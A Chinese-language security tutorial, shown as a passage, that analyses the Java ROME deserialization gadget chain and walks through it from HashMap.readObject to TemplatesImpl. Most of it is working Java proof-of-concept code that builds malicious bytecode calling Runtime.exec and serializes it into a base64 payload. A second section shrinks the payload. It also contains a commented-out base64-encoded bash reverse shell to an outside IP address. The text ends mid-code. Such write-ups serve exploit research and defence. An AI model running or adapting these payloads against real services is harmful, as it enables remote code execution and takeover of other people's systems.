#### 前置
##### ObjectBean
`com.sun.syndication.feed.impl.ObjectBean`是`Rome`提供的一个封装类型,
初始化时提供了一个`Class`类型和一个`Object`对象实例进行封装
他也有三个成员变量，分别是`EqualsBean`、
`ToStringBean`、`CloneableBean`类，为`ObjectBean`提供了`equals`、`toString`、`clone`以及`hashCode`方法
在`ObjectBean#hashCode`中，调用了`EqualsBean`类的`beanHashCode`方法
这里调用了_obj成员变量的`toString`方法，这里就是漏洞触发的地方了
##### ToStringBean
`com.sun.syndication.feed.impl.ToStringBean`是给对象提供`toString`方法的类,
类中有两个`toString`方法, 第一个是无参的方法, 获取调用链中上一个类或`_obj`属性中保存对象的类名, 并调用第二个`toString`方法.
在第二个`toString`方法中,
会调用`BeanIntrospector#getPropertyDescriptors`来获取`_beanClass`的所有`getter`和`setter`方法,
接着判断参数的长度, 长度等于`0`的方法会使用`_obj`实例进行反射调用, 通过这个点我们可以来触发`TemplatesImpl`的利用链.
#### 编写POC
    package ysoserial.vulndemo;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import com.sun.syndication.feed.impl.EqualsBean;
    import com.sun.syndication.feed.impl.ObjectBean;
    import com.sun.syndication.feed.impl.ToStringBean;
    import javassist.CannotCompileException;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.NotFoundException;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.Base64;
    import java.util.HashMap;
    public class Rome_POC {
        //序列化操作工具
        public static String serialize(Object obj) throws IOException {
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream objOutput = new ObjectOutputStream(barr);
            objOutput.writeObject(obj);
            byte[] bytes = barr.toByteArray();
            objOutput.close();
            String bytesOfBase = Base64.getEncoder().encodeToString(bytes);
            return bytesOfBase;
        }
        //反序列化操作工具
        public static void unserialize(String bytesOfBase) throws IOException, ClassNotFoundException {
            byte[] bytes = Base64.getDecoder().decode(bytesOfBase);
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
            ObjectInputStream objInput = new ObjectInputStream(byteArrayInputStream);
            objInput.readObject();
        }
        //为类的属性设置值的工具
        public static void setFieldVlue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
        //payload的生成
        public static void exp() throws CannotCompileException, NotFoundException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
            //生成恶意的bytecodes
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.makeClass("evilexp");
            ctClass.makeClassInitializer().insertBefore(cmd);
            ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
            byte[] bytes = ctClass.toBytecode();
            //因为在TemplatesImp类中的构造函数中，_bytecodes为二维数组
            byte[][] bytes1 = new byte[][]{bytes};
            //创建TemplatesImpl类
            TemplatesImpl templates = new TemplatesImpl();
            setFieldVlue(templates, "_name", "RoboTerh");
            setFieldVlue(templates, "_bytecodes", bytes1);
            setFieldVlue(templates, "_tfactory", new TransformerFactoryImpl());
            //封装一个无害的类并放入Map中
            ObjectBean roboTerh = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "RoboTerh"));
            HashMap hashmap = new HashMap();
            hashmap.put(roboTerh, "RoboTerh");
            //通过反射写入恶意类进入map中
            ObjectBean objectBean = new ObjectBean(Templates.class, templates);
            setFieldVlue(roboTerh, "_equalsBean", new EqualsBean(ObjectBean.class, objectBean));
            //生成payload并输出
            String payload = serialize(hashmap);
            System.out.println(payload);
            //触发payload，验证是否成功
            unserialize(payload);
        }
        public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
            exp();
        }
    }
##### 分析调用链
在unserialize方法中打上断点
在unserialize方法中的readObject方法中开始反序列化
跟进到了`HashMap#readObject`
之后就会求key值的hash，而且这个时候的Key是`ObjectBean`类
之后在`HashMap#hash`中，会调用key值得hashcode()方法
直接跳转进入`ObjectBean#hashCode`，调用了他的属性`_equalsBean`的beanHashCode方法
跟进`EqualsBean#beanHashCode`方法，这里的_obj是`ObjectBean`类的对象，调用了他的`toString`方法
跟进`ObjectBean#toString`方法，这里的`_toStringBean`属性，是`ToStringBean`类的对象，调用了他的`toString`方法
之后跟进`ToStringBean#toString`，这里获取了所有的getter和setter，然后判断参数长度调用了一些方法，当然包括了`getOutputProperties`这个方法
后面的步骤就是`TemplatesImpl`这个调用链了
    getOutputProperties
        newTransformer
            getTransletInstance
                defineTransletClasses
所以他的调用链为：
    HashMap.readObject()
        ObjectBean.hashCode()
                EqualsBean.beanHashCode()
                    ObjectBean.toString()
                        ToStringBean.toString()
                            TemplatesImpl.getOutputProperties()
#### 其他的骚操作
##### 缩短payload
[我们从这篇文章](https://xz.aliyun.com/t/10824)里面可以得到缩小payload的方法
文章提到三部分的缩小
  * 序列化数据本身的缩小
  * 针对`TemplatesImpl`中`_bytecodes`字节码的缩小
  * 对于执行的代码如何缩小（`STATIC`代码块）
我们针对ROME链进行分析
在前面编写POC的时候对于TemplatesImpl可以进行优化操作
  * 设置`_name`名称可以是一个字符
  * 其中`_tfactory`属性可以删除（分析`TemplatesImpl`得出）
  * 其中`EvilByteCodes`类捕获异常后无需处理
所以优化之后为：
    package ysoserial.vulndemo;
    import com.sun.syndication.feed.impl.EqualsBean;
    import com.sun.syndication.feed.impl.ObjectBean;
    import com.sun.syndication.feed.impl.ToStringBean;
    import org.objectweb.asm.ClassReader;
    import org.objectweb.asm.ClassVisitor;
    import org.objectweb.asm.ClassWriter;
    import org.objectweb.asm.Opcodes;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import javassist.*;
    import javax.xml.transform.Templates;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.Base64;
    import java.util.HashMap;
    public class Rome_shorter2 {
        public static byte[] getTemplatesImpl(String cmd) throws NotFoundException, CannotCompileException, IOException {
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.makeClass("a");
            CtClass superClass = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = CtNewConstructor.make("    public a(){\n" +
                "        try {\n" +
                "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
                "        }catch (Exception ignored){}\n" +
                "    }", ctClass);
            ctClass.addConstructor(constructor);
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        }
        //使用asm技术继续缩短
        public static byte[] shorterTemplatesImpl(byte[] bytes) throws IOException {
            String path = System.getProperty("user.dir") + File.separator + "a.class"; //File.separator是分隔符
            try {
                Files.write(Paths.get(path), bytes);
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                //asm删除LINENUMBER
                byte[] allBytes = Files.readAllBytes(Paths.get(path));
                ClassReader classReader = new ClassReader(allBytes);
                ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
                int api = Opcodes.ASM9;
                ClassVisitor classVisitor = new shortClassVisitor(api, classWriter);
                int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
                classReader.accept(classVisitor, parsingOptions);
                byte[] out = classWriter.toByteArray();
                Files.write(Paths.get(path), out);
            } catch (IOException e) {
                e.printStackTrace();
            }
            byte[] bytes1 = Files.readAllBytes(Paths.get("a.class"));
            //删除class文件
            Files.delete(Paths.get("a.class"));
            return bytes1;
        }
        //因为ClassVisitor是抽象类，需要继承
        public static class shortClassVisitor extends ClassVisitor{
            private final int api;
            public shortClassVisitor(int api, ClassVisitor classVisitor){
                super(api, classVisitor);
                this.api = api;
            }
        }
        //设置属性值
        public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
        public static String serialize(Object obj) throws IOException {
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream objOutput = new ObjectOutputStream(barr);
            objOutput.writeObject(obj);
            byte[] bytes = barr.toByteArray();
            objOutput.close();
            return Base64.getEncoder().encodeToString(bytes);
        }
        public static void unserialize(String code) throws IOException, ClassNotFoundException {
            byte[] decode = Base64.getDecoder().decode(code);
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
        }
        public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException, IOException, ClassNotFoundException {
            TemplatesImpl templates = new TemplatesImpl();
            //setFieldValue(templates, "_bytecodes", new byte[][]{getTemplatesImpl("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjQuMjA3LjEyMS84MDAwIDA+JjE=}|{base64,-d}|{bash,-i}")});
            setFieldValue(templates, "_bytecodes", new byte[][]{shorterTemplatesImpl(getTemplatesImpl("calc"))});
            setFieldValue(templates, "_name", "a");
            ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
            EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
            ObjectBean objectBean = new ObjectBean(String.class, "a");
            HashMap hashMap = new HashMap();
            hashMap.put(null, null);